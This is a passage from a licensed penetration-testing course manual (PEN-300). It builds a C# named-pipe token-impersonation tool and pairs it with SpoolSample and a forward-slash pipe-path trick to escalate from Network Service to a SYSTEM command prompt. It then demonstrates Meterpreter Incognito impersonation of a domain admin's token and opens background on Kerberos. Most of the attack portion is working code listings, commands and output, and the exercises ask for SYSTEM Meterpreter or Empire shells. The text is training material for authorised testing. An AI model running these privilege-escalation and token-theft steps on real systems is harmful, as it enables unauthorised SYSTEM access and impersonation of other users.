Next, we’ll invoke GetTokenInformation. This API can return a variety of information, but we’ll 
simply request the SID. The function prototype is shown in Listing 565. 
 
720 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
openthreadtoken 
721 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation 
722 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsidw 
723 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
getcurrentthread 
724 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/secauthz/access-rights-for-access-token-objects 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
475 
BOOL GetTokenInformation( 
  HANDLE                  TokenHandle, 
  TOKEN_INFORMATION_CLASS TokenInformationClass, 
  LPVOID                  TokenInformation, 
  DWORD                   TokenInformationLength, 
  PDWORD                  ReturnLength 
); 
Listing 565 - GetTokenInformation function prototype 
The first argument (TokenHandle) is the token we obtained from OpenThreadToken, and the 
second argument (TokenInformationClass) specifies the type of information we want to obtain. 
TOKEN_INFORMATION_CLASS725 is an enum that contains values specifying the type of 
information we can retrieve from an access token via GetTokenInformation. Since we simply want 
the SID, we can pass TokenUser, which has the numerical value of “1”, for the 
TOKEN_INFORMATION_CLASS argument. 
TokenInformation is a pointer to the output buffer that will be populated by the API and 
TokenInformationLength is the size of the output buffer. Since we don’t know the required size of 
the buffer, the recommended way of using the API is to call it twice. The first time, we set these 
two arguments values to NULL and 0 respectively and then ReturnLength will be populated with 
the required size. 
After this, we can allocate an appropriate buffer and call the API a second time. The require code 
updates are shown in Listing 566. 
[DllImport("advapi32.dll", SetLastError = true)] 
static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, 
IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength); 
... 
int TokenInfLength = 0; 
GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength); 
IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength); 
GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength); 
Listing 566 - Code additions to call GetTokenInformation 
To allocate the TokenInformation buffer, we’ll use the .NET Marshal.AllocHGlobal726 method, 
which can allocate unmanaged memory. 
As the final step, we’ll use ConvertSidToStringSid to convert the binary SID to a SID string that we 
can read. The function prototype of ConvertSidToStringSid is shown in Listing 567. 
BOOL ConvertSidToStringSidW( 
  PSID   Sid, 
  LPWSTR *StringSid 
); 
Listing 567 - ConvertSidToStringSid function prototype 
 
725 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_information_class 
726 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=netcore-3.1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
476 
The first argument (Sid) is a pointer to the SID. The SID is in the output buffer that was populated 
by GetTokenInformation, but we must extract it first. 
One way to do this is to define the TOKEN_USER727 structure (which is part of the 
TOKEN_INFORMATION_CLASS used by GetTokenInformation) and then marshal a pointer to it 
with Marshal.PtrToStructure.728 
For the last argument (*StringSid), we’ll supply the output string. Here we can simply supply an 
empty 
pointer 
and 
once 
it 
gets 
populated, 
marshal 
it 
to 
a 
C# 
string 
with 
Marshal.PtrToStringAuto.729 
The required structures, import, and added code are shown in Listing 568. 
 [StructLayout(LayoutKind.Sequential)] 
public struct SID_AND_ATTRIBUTES 
{ 
    public IntPtr Sid; 
    public int Attributes; 
} 
 
public struct TOKEN_USER 
{ 
    public SID_AND_ATTRIBUTES User; 
} 
... 
[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)] 
static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid); 
... 
TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, 
typeof(TOKEN_USER)); 
IntPtr pstr = IntPtr.Zero; 
Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr); 
string sidstr = Marshal.PtrToStringAuto(pstr); 
Console.WriteLine(@"Found sid {0}", sidstr); 
Listing 568 - Code additions to call ConvertSidToStringSid 
At the end of Listing 568, we print the SID associated with the token to the console, showing 
which user we impersonated. 
Now we have finally written all the code we need to start our test and better understand the use 
of named pipes for impersonation and privilege escalation. 
As previously mentioned, we must execute the code in the context of a user account that has the 
SeImpersonatePrivilege access right. For our attack demonstration, we’ll log in to appsrv01 as the 
domain user admin and use PsExec to open a command prompt as the built-in Network Service 
account as shown in Listing 569. 
 
727 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_token_user 
728 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=netcore-3.1 
729 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.ptrtostringauto?view=netcore-3.1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
477 
C:\Tools\SysInternalsSuite> psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe 
 
PsExec v2.2 - Execute processes remotely 
Copyright (C) 2001-2016 Mark Russinovich 
Sysinternals - www.sysinternals.com 
Listing 569 - Opening a command prompt as Network Service 
Before we execute our application, we can verify the user and the presence of 
SeImpersonatePrivilege in the new command prompt: 
C:\Tools> whoami 
nt authority\network service 
 
C:\Tools> whoami /priv 
 
PRIVILEGES INFORMATION 
---------------------- 
 
Privilege Name                Description                               State 
============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled 
SeMachineAccountPrivilege     Add workstations to domain                Disabled 
SeAuditPrivilege              Generate security audits                  Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
Listing 570 - User and privileges 
Now we can compile our assembled code and transfer it to appsrv01. 
Next, we execute it and supply a random pipe name as shown in Listing 571. 
C:\Tools>PrintSpooferNet.exe \\.\pipe\test 
Listing 571 - Starting the pipe server 
To simulate a connection, we can open an elevated command prompt and write to the pipe as 
shown in Listing 572. 
C:\Users\Administrator> echo hello > \\localhost\pipe\test 
Listing 572 - Writing to the pipe 
When we switch back to the command prompt running our application, we find that a SID has 
been printed: 
C:\Tools> PrintSpooferNet.exe \\.\pipe\test 
Found sid S-1-5-21-1587569303-1110564223-1586047116-500 
Listing 573 - SID of built in administrator 
Our code has impersonated a token and resolved the associated SID. 
To verify that this SID belongs to the administrator account, we can switch back to the elevated 
command prompt and dump it as shown in Listing 574. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
478 
C:\Users\Administrator> whoami /user 
 
USER INFORMATION 
---------------- 
 
User Name           SID 
=================== ============================================= 
corp1\administrator S-1-5-21-1587569303-1110564223-1586047116-500 
Listing 574 - Dumping SID with whoami 
This proves that we have indeed impersonated the built-in domain administrator account. More 
importantly, we can impersonate anyone who connects to our named pipe. 
It’s now time to test our application leveraging the print spooler service. Communication to the 
spooler service is done through Print System Remote Protocol (MS-RPRN),730 which dates back to 
2007 and is not well documented. Fortunately for us, the MS-RPRN works through named pipes 
and the pipe name used by the print spooler service is \pipe\spoolss.   
The 
potential 
for 
abuse 
comes 
from 
the 
RpcOpenPrinter731 
and 
RpcRemoteFindFirstPrinterChangeNotification732 functions. RpcOpenPrinter allows us to retrieve a 
handle for the printer server, which is used as an argument to the second API. 
RpcRemoteFindFirstPrinterChangeNotification essentially monitors printer object changes and 
sends change notifications to print clients. 
Once again, this change notification requires the print spooler to access the print client. If we 
ensure that the print client is our named pipe, it will obtain a SYSTEM token that we can 
impersonate. 
Sadly, unlike regular Win32 APIs, MS-RPRN APIs can not be called directly. Print spooler 
functionality resides in the unmanaged RpcRT4.dll library and is called through the proxy function 
NdrClientCall2,733 which uses a binary format to pass and invoke underlying functions. The 
implementation of these calls are beyond the scope of this module. 
Luckily, we can use the SpoolSample C# implementation written by Lee Christensen734 or the 
PowerShell code written by Vincent Le Toux.735 A compiled version of SpoolSample is located in 
the C:\Tools folder of appsrv01. 
 
730 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-
0a4be14e2fc1 
731 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-
1dce21e1313f 
732 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-
87d09ab2fd83 
733 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/rpcndr/nf-rpcndr-ndrclientcall2 
734 (Lee Christensen, 2018), https://github.com/leechristensen/SpoolSample 
735 (Vincent Le Toux, 2018), https://github.com/vletoux/SpoolerScanner 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
479 
 
The SpoolSample application and the entire printer bug technique was developed 
to be used in an Active Directory setting and was not specifically designed for 
local privilege escalation. 
When we use SpoolSample, we must specify the name of the server to connect to (the victim) 
and the name of the server we control (the attacker), also called the capture server. Since we are 
performing the attack locally, both servers are the same. This presents a challenge. 
The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print 
client (through our pipe) but since they are on the same host, they in effect require the same 
default pipe name (pipe\spoolss). Because of this, we cannot create the named pipe with the 
required name easily. 
In order to find a solution, we first must understand the problem in detail. To do this, we will 
monitor the target system with Process Monitor from SysInternals while executing 
SpoolSample.exe against an arbitrary pipe name.Process Monitor is located in the 
C:\Tools\SysInternals folder. 
First, we’ll configure a capture filter with Filter > Filter and select Process Name from the 
dropdown menu, setting this to “spoolsv.exe” to filter for print spooler events. We’ll then click Add 
followed by Apply and exit the filter menu by selecting OK. 
Then, we’ll execute SpoolSample.exe and specify the current hostname followed by an arbitrary 
pipe name as shown in Listing 575. 
C:\Tools> SpoolSample.exe appsrv01 appsrv01\test 
[+] Converted DLL to shellcode 
[+] Executing RDI 
[+] Calling exported function 
TargetServer: \\appsrv01, CaptureServer: \\appsrv01\test 
Attempted printer notification and received an invalid handle. The coerced 
authentication probably worked! 
Listing 575 - Invoking SpoolSample with arbitrary pipe name 
Although the application output indicates that a printer notification callback was configured, 
Process Monitor shows that no access to the arbitrary pipe name has occurred as displayed in 
Figure 226. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
480 
 
Figure 226: No connections from spoolss 
This is because, before attempting to access the client pipe, the print spooler service validates the 
pipe path, making sure it matches the default name “pipe\spoolss”. Our arbitrary pipe “test” fails 
this validation and, consequently, the print spooler service doesn’t even attempt to connect to the 
client. This is why we don’t see any successful nor failed attempt in Process Monitor. 
Unfortunately, as mentioned before, we cannot specify “spoolss” as a name since it is already in 
use by the print spooler service we are targeting. 
At this point, it is useful to know what happens when a file path is supplied to a Win32 API. When 
directory separators are used as a part of the file path, they are converted to canonical form. 
Specifically, forward slashes (“/”) will be converted to backward slashes (“\”). This is also known 
as file path normalization.736 
Interestingly enough, the security researcher @jonaslyk discovered that if we provide 
SpoolSample with an arbitrary pipe name containing a forward slash after the hostname 
(“appsrv01/test”), the spooler service will not interpret it correctly and it will append the default 
name “pipe\spoolss” to our own path before processing it. This effectively bypasses the path 
validation and the resulting path (“appsrv01/test\pipe\spoolss”) is then normalized before the 
spooler service attempts to send a print object change notification message to the client. 
This obviously can help us because this pipe name differs from the default one used by the print 
spooler service, and we can register it in order to simulate a print client. 
To verify this, we can repeat our last example but this time supplying an arbitrary pipe name that 
contains a forward slash in the print client name: 
C:\Tools> SpoolSample.exe appsrv01 appsrv01/test 
[+] Converted DLL to shellcode 
[+] Executing RDI 
 
736 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
481 
[+] Calling exported function 
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/test 
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network 
address is invalid. 
Listing 576 - Invoking SpoolSample with forward slash 
We receive an error and Process Monitor confirms the theory (Figure 227). 
 
Figure 227: Path canonicalized and attempted access 
First, the path we supplied (appsrv01/test) has been switched to a canonical form (appsrv01\test) 
as part of the full path. 
Second, spoolsv.exe attempted to access the named pipe \\.\appsrv01\test\pipe\spoolss while 
performing the callback. Since we have not created a pipe server by that name yet, the request 
failed. 
At this point, we just need to create a pipe server with that name and simulate a print client. When 
we execute SpoolSample, the print spooler service will connect to our pipe. 
To do this, we’ll open another command prompt and launch our PrintSpooferNet application. 
Recall that we are launching our application from a Network Service command prompt because 
we are demonstrating a scenario where we have exploited a process that has the 
SeImpersonatePrivilege, and we are trying to escalate to SYSTEM. 
C:\Tools> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss 
Listing 577 - Creating the pipe server 
Now we’ll invoke SpoolSample to trigger the change notification against the capture server 
(appsrv01/pipe/test) as shown in Listing 578. 
C:\Tools> SpoolSample.exe appsrv01 appsrv01/pipe/test 
[+] Converted DLL to shellcode 
[+] Executing RDI 
[+] Calling exported function 
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/pipe/test 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
482 
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server 
is unavailable. 
Listing 578 - Invoking SpoolSample again the pipe server 
Our application reveals a connection from the “S-1-5-18” SID : 
C:\Tools>PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss 
Found sid S-1-5-18 
Listing 579 - Invoking SpoolSample with forward slash 
This SID value belongs to the SYSTEM account737 proving that our technique worked. Excellent! 
We now have a way of forcing the SYSTEM account to authenticate to our named pipe, which 
allows us to impersonate it. To complete this attack, we must now take advantage of the 
impersonated token, which we will do by launching a new command prompt as SYSTEM. 
The Win32 CreateProcessWithTokenW738 API can create a new process based on a token. The 
token must be a primary token, so we’ll first use DuplicateTokenEx to convert the impersonation 
token to a primary token. 
The function prototype for DuplicateTokenEx is shown in Listing 580. 
BOOL DuplicateTokenEx( 
  HANDLE                       hExistingToken, 
  DWORD                        dwDesiredAccess, 
  LPSECURITY_ATTRIBUTES        lpTokenAttributes, 
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, 
  TOKEN_TYPE                   TokenType, 
  PHANDLE                      phNewToken 
); 
Listing 580 - DuplicateTokenEx function prototype 
First, we’ll supply the impersonation token by recovering it with OpenThreadToken. We’ll request 
full access to the token with the numerical value 0xF01FF for the dwDesiredAccess argument. For 
the third argument (lpTokenAttributes), we’ll use a default security descriptor for the new token by 
setting this to NULL. 
ImpersonationLevel must be set to SecurityImpersonation,739 which is the access type we 
currently have to the token. This has a numerical value of “2”. For the TokenType, we’ll specify a 
primary token (TokenPrimary740) by setting this to “1”. 
The final argument (phNewToken) is a pointer that will be populated with the handle to the 
duplicated token. The code additions are shown in Listing 581. 
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint 
dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, 
out IntPtr phNewToken); 
 
737 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids 
738 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw 
739 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-security_impersonation_level 
740 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_type 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
483 
... 
IntPtr hSystemToken = IntPtr.Zero; 
DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken); 
Listing 581 - Code additions to call DuplicateTokenEx 
With the token duplicated as a primary token, we can call CreateProcessWithToken to create a 
command prompt as SYSTEM. 
Listing 582 lists the function prototype for CreateProcessWithToken. 
BOOL CreateProcessWithTokenW( 
  HANDLE                hToken, 
  DWORD                 dwLogonFlags, 
  LPCWSTR               lpApplicationName, 
  LPWSTR                lpCommandLine, 
  DWORD                 dwCreationFlags, 
  LPVOID                lpEnvironment, 
  LPCWSTR               lpCurrentDirectory, 
  LPSTARTUPINFOW        lpStartupInfo, 
  LPPROCESS_INFORMATION lpProcessInformation 
); 
Listing 582 - CreateProcessWithToken function prototype 
First, we’ll supply the newly duplicated token followed by a logon option, which we set to its 
default of 0. For the third (lpApplicationName) and fourth (lpCommandLine) arguments, we’ll 
supply NULL and the full path of cmd.exe, respectively. 
The creation flags (dwCreationFlags), environment block (lpEnvironment), and current directory 
(lpCurrentDirectory) arguments can be set to 0, NULL, and NULL respectively to select the default 
options. 
For the two last arguments (lpStartupInfo and lpProcessInformation), we must pass 
STARTUPINFO741 and PROCESS_INFORMATION742 structures, which are populated by the API 
during execution. Neither of these are defined in P/invoke imports so we must define them 
ourselves as shown in the following code: 
[StructLayout(LayoutKind.Sequential)] 
public struct PROCESS_INFORMATION 
{ 
    public IntPtr hProcess; 
    public IntPtr hThread; 
    public int dwProcessId; 
    public int dwThreadId; 
} 
 
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] 
public struct STARTUPINFO 
{ 
    public Int32 cb; 
    public string lpReserved; 
 
741 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa 
742 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-
process_information 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
484 
    public string lpDesktop; 
    public string lpTitle; 
    public Int32 dwX; 
    public Int32 dwY; 
    public Int32 dwXSize; 
    public Int32 dwYSize; 
    public Int32 dwXCountChars; 
    public Int32 dwYCountChars; 
    public Int32 dwFillAttribute; 
    public Int32 dwFlags; 
    public Int16 wShowWindow; 
    public Int16 cbReserved2; 
    public IntPtr lpReserved2; 
    public IntPtr hStdInput; 
    public IntPtr hStdOutput; 
    public IntPtr hStdError; 
} 
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)] 
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, 
string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr 
lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out 
PROCESS_INFORMATION lpProcessInformation); 
... 
PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); 
STARTUPINFO si = new STARTUPINFO(); 
si.cb = Marshal.SizeOf(si); 
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, 
IntPtr.Zero, null, ref si, out pi); 
Listing 583 - Code additions to call CreateProcessWithTokenW 
With all the code written, we’ll compile and transfer it to the Windows Server 2019 machine. We’ll 
execute this just as before, by first launching our application to create the pipe server with the 
name “\\.\appsrv01\test\pipe\spoolss”. 
Next, we’ll launch SpoolSample with the capture server set to “\\appsrv01/pipe/test”, which will 
force the SYSTEM account to connect to our named pipe and a new command prompt is opened. 
When we interact with it and display the user, we find it to be SYSTEM: 
C:\Windows\system32> whoami /user 
 
USER INFORMATION 
---------------- 
 
User Name   SID 
=========== ======== 
nt authority\system S-1-5-18 
Listing 584 - System command prompt 
With this attack, we can elevate our privileges from an unprivileged account that has the 
SeImpersonatePrivilege to SYSTEM on any modern Windows system including Windows 2019 
and the newest versions of Windows 10. Nice! 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
485 
 
A C++ implementation of this attack that has the SpoolSample functionality 
embedded is available by the researcher who discovered the technique.743 
Most native and third-party services that do not require administrative permissions run as 
Network Service or Local Service, partly due to Microsoft’s recommendation. This attack 
technique means that compromising an unprivileged service is just as valuable as a SYSTEM 
service. 
The technique shown in this section is not the only possible way of leveraging impersonation to 
obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex 
Ionescu and Yarden Shafir.744 It impersonates the RPC system service (RpcSs),745 which typically 
contains SYSTEM tokens that can be stolen. Note that this technique only works for Network 
Service. 
On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains 
SYSTEM integrity through a local man-in-the-middle attack through COM.746 It is blocked on 
Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release 
of the RoguePotato747 tool, expanding this technique to provide access to the RpcSs service and 
subsequently SYSTEM integrity access. 
Lastly, the beans748 technique based on local man-in-the-middle authentication with Windows 
Remote Management (WinRM)749 also yields SYSTEM integrity access. The caveat of this 
technique is that it only works on Windows clients, not servers, by default. 
In the next section, we’ll demonstrate how to impersonate tokens from other authenticated users 
instead of simply advancing straight to SYSTEM. 
12.2.2.1 Exercises 
1. 
Combine the code and verify the token impersonation. 
2. 
Use the C# code and combine it with previous tradecraft to obtain a Meterpreter, Covenant, 
or Empire SYSTEM shell. 
3. 
Try to use the attack in the context of Local Service instead of Network Service. 
 
743 (Clément Labro, 2020), https://github.com/itm4n/PrintSpoofer 
744 (Alex Ionescu, 2020), https://windows-internals.com/faxing-your-way-to-system/ 
745 (Microsoft, 2009), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-
2003/cc787851(v=ws.10)?redirectedfrom=MSDN 
746 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal 
747 (@decoder_it, 2020), https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/ 
748 (@decoder_it, 2019), https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/ 
749 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winrm/portal 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
486 
12.2.3 
Fun with Incognito 
In this section, we’ll use the Meterpreter Incognito750 module to impersonate any logged in users 
and obtain code execution in their context without access to any passwords or hashes. 
Although we’ll use Mimikatz to collect Kerberos authentication credentials later 
in this module, this access token attack vector does not rely on Mimikatz and 
may evade some detection software. 
To demonstrate this, we’ll authenticate to appsrv01 as the admin user through Remote Desktop 
and leave the connection open. We’ll then switch to one of the SYSTEM integrity Meterpreter 
shells we obtained in the previous sections.  
Next, we’ll load the Incognito extension through the load command as shown in Listing 585 and 
run help to display available commands. 
meterpreter > load incognito 
Loading extension incognito...Success. 
 
meterpreter > help incognito 
 
Incognito Commands 
================== 
 
    Command              Description 
    -------              ----------- 
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens 
    add_user             Attempt to add a user with all tokens 
    impersonate_token    Impersonate specified token 
    list_tokens          List tokens available under current user context 
    snarf_hashes         Snarf challenge/response hashes for every token 
Listing 585 - Loading Incognito extension 
We’ll focus on list_tokens -u, which will list all currently used tokens by unique username: 
meterpreter > list_tokens -u 
 
Delegation Tokens Available 
======================================== 
corp1\admin 
IIS APPPOOL\DefaultAppPool 
NT AUTHORITY\IUSR 
NT AUTHORITY\LOCAL SERVICE 
NT AUTHORITY\NETWORK SERVICE 
NT AUTHORITY\SYSTEM 
NT SERVICE\SQLTELEMETRY$SQLEXPRESS 
Window Manager\DWM-1 
 
750 (Rapid7, 2015), https://github.com/rapid7/meterpreter/blob/master/source/extensions/incognito/incognito.c 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
487 
 
Impersonation Tokens Available 
======================================== 
NT AUTHORITY\ANONYMOUS LOGON 
Listing 586 - Dumping available tokens 
The output reveals a delegation token for the domain user admin. 
Next we’ll run impersonate_token to impersonate the admin user through the Win32 
ImpersonateLoggedOnUser751 API. To invoke it, we must specify the user name of the token we 
want to impersonate: 
meterpreter > impersonate_token corp1\\admin 
[+] Delegation token available 
[+] Successfully impersonated user corp1\admin 
 
meterpreter > getuid 
Server username: corp1\admin 
Listing 587 - Impersonating token for the user admin 
Listing 587 shows that we were able to impersonate the domain user admin from a delegation 
token, which will allow us to perform actions on this server and authenticate against remote 
computers in the context of that user. 
With this approach, we have impersonated a user within a Meterpreter shell without writing to 
disk. 
12.2.3.1 Exercise 
1. 
Use a SYSTEM Meterpreter shell to list all tokens and impersonate a delegation token for the 
domain user admin. 
12.3 Kerberos and Domain Credentials 
In an Active Directory implementation, Kerberos752 handles most user and integrated service 
authentication. 
In the following sections, we’ll explore how the Kerberos protocol is implemented in Windows and 
how we can leverage it for credential stealing. 
12.3.1 
Kerberos Authentication 
The Microsoft implementation of the Kerberos authentication protocol was adopted from the 
Kerberos version 5 authentication protocol created by MIT753 and has been Microsoft’s primary 
authentication mechanism since Windows Server 2003. While NTLM authentication works 
through a principle of challenge and response, Windows-based Kerberos authentication uses a 
ticket system. 
 
751 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-
impersonateloggedonuser 
752 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos 
753 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Kerberos_(protocol) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
488 
At a high level, Kerberos client authentication to a service in Active Directory involves the use of a 
domain controller in the role of a Key Distribution Center (KDC).754 This process is shown in Figure 
228. 
 
Figure 228: Diagram of Kerberos Authentication 
Let’s review this process in detail in order to lay a foundation for discussion in the following 
section. 
When a user logs in, a request is sent to the Domain Controller. This DC serves as a KDC and runs 
the Authentication Server service. The initial Authentication Server Request (AS_REQ) contains a 
timestamp encrypted using a hash derived from the current user’s username and password.755 
When the service receives the request, it looks up the password hash associated with that user 
and attempts to decrypt the timestamp. If the decryption process is successful and the 
timestamp is not a duplicate (a potential replay attack), the authentication is considered 
successful. 
The service replies to the client with an Authentication Server Reply (AS_REP), which contains a 
session key (since Kerberos is stateless) and a Ticket Granting Ticket (TGT). The session key is 
encrypted using the user’s password hash, which the client could decrypt and reuse. The TGT 
contains user information (including group memberships), the domain, a timestamp, the IP 
address of the client, and the session key. 
 
754 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center 
755 (Skip Duckwall, Benjamin Delpy, 2014), https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-
Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
489 
In order to avoid tampering, the TGT is encrypted by a secret key known only to the KDC and can 
not be decrypted by the client. Once the client has received the session key and the TGT, the KDC 
considers the client authentication complete. By default, the TGT will be valid for 10 hours. During 
this time, the user is not required to retype the password and the TGT can be renewed without 
entering the password. 
When the user attempts to access domain resources, such as a network share, Exchange 
mailbox, or some other application with a registered Service Principal Name (SPN),756 the KDC is 
contacted again. 
This time, the client constructs a Ticket Granting Service Request (TGS_REQ) packet that consists 
of the current user and a timestamp (encrypted using the session key), the SPN of the resource, 
and the encrypted TGT. 
Next, the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the 
domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then 
extracted from the decrypted TGT, and this key is used to decrypt the username and timestamp 
of the request. If the TGT has a valid timestamp (no replay detected and the request has not 
expired), the TGT and session key usernames match, and the origin and TGT IP addresses match, 
the request is accepted. 
If this succeeds, the ticket granting service responds to the client with a Ticket Granting Server 
Reply (TGS_REP). This packet contains three parts: 
1. 
The SPN to which access has been granted. 
2. 
A session key to be used between the client and the SPN. 
3. 
A service ticket containing the username and group memberships along with the newly-
created session key. 
The first two parts (the SPN and session key) are encrypted using the session key associated 
with the creation of the TGT and the service ticket is encrypted using the password hash of the 
service account registered with the target SPN. 
Once the authentication process with the KDC is complete and the client has both a session key 
